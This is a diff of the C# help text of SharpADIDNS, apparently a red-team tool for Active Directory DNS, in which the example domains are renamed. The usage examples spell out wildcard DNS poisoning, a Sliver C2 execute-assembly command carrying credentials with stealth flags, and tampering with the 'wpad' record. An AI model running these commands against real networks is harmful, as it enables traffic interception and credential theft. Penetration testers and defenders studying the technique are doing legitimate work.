@@ -2626,9 +2626,9 @@ namespace SharpADIDNS
         private static void PrintTargeting()
         {
             Console.WriteLine("TARGETING");
-            Console.WriteLine("  --zone <fqdn>          DNS zone, e.g. corp.local                       [required]");
+            Console.WriteLine("  --zone <fqdn>          DNS zone, e.g. redteamnotes.local                       [required]");
             Console.WriteLine("  --name <label>         Record name ('@' = apex, '*' = wildcard)        [required*]");
-            Console.WriteLine("  --dn <DN>              Naming context, e.g. DC=corp,DC=local           [required]");
+            Console.WriteLine("  --dn <DN>              Naming context, e.g. DC=redteamnotes,DC=local           [required]");
             Console.WriteLine("  --partition <name>     DomainDnsZones (default) | ForestDnsZones | System");
             Console.WriteLine("  --server <host>        Target DC FQDN or IP  (default: serverless bind)");
             Console.WriteLine("                         * --name is not required for the 'enum' action");
@@ -2776,23 +2776,23 @@ namespace SharpADIDNS
             Console.WriteLine("EXAMPLES   (see docs/RECIPES.md for end-to-end scenarios)");
             Console.WriteLine();
             Console.WriteLine("  # Recon: list all dnsNode under a zone");
-            Console.WriteLine("  SharpADIDNS.exe enum --zone corp.local --dn DC=corp,DC=local");
+            Console.WriteLine("  SharpADIDNS.exe enum --zone redteamnotes.local --dn DC=redteamnotes,DC=local");
             Console.WriteLine();
             Console.WriteLine("  # Read one record + decode all blobs + ACL");
-            Console.WriteLine("  SharpADIDNS.exe query --zone corp.local --name sccm --dn DC=corp,DC=local");
+            Console.WriteLine("  SharpADIDNS.exe query --zone redteamnotes.local --name sccm --dn DC=redteamnotes,DC=local");
             Console.WriteLine();
             Console.WriteLine("  # Wildcard A (classic ADIDNS poisoning)");
-            Console.WriteLine("  SharpADIDNS.exe add --zone corp.local --name \"*\" --type A \\");
-            Console.WriteLine("      --data 10.0.0.66 --dn DC=corp,DC=local --ttl 60");
+            Console.WriteLine("  SharpADIDNS.exe add --zone redteamnotes.local --name \"*\" --type A \\");
+            Console.WriteLine("      --data 10.0.0.66 --dn DC=redteamnotes,DC=local --ttl 60");
             Console.WriteLine();
             Console.WriteLine("  # Sliver execute-assembly recommended pattern");
-            Console.WriteLine("  SharpADIDNS.exe --c2 --username 'corp\\u' --password-base64 <b64> \\");
-            Console.WriteLine("      --zone corp.local --dn DC=corp,DC=local --server dc.corp.local \\");
+            Console.WriteLine("  SharpADIDNS.exe --c2 --username 'redteamnotes\\u' --password-base64 <b64> \\");
+            Console.WriteLine("      --zone redteamnotes.local --dn DC=redteamnotes,DC=local --server dc.redteamnotes.local \\");
             Console.WriteLine("      add --name sccm --type A --data 10.0.0.66 \\");
             Console.WriteLine("          --mimic-aging --set-owner 'corp\\DnsAdmins'");
             Console.WriteLine();
             Console.WriteLine("  # Tombstone (soft delete; AD scavenges later)");
-            Console.WriteLine("  SharpADIDNS.exe disable --zone corp.local --name wpad --dn DC=corp,DC=local");
+            Console.WriteLine("  SharpADIDNS.exe disable --zone redteamnotes.local --name wpad --dn DC=redteamnotes,DC=local");
             Console.WriteLine();
         }
 
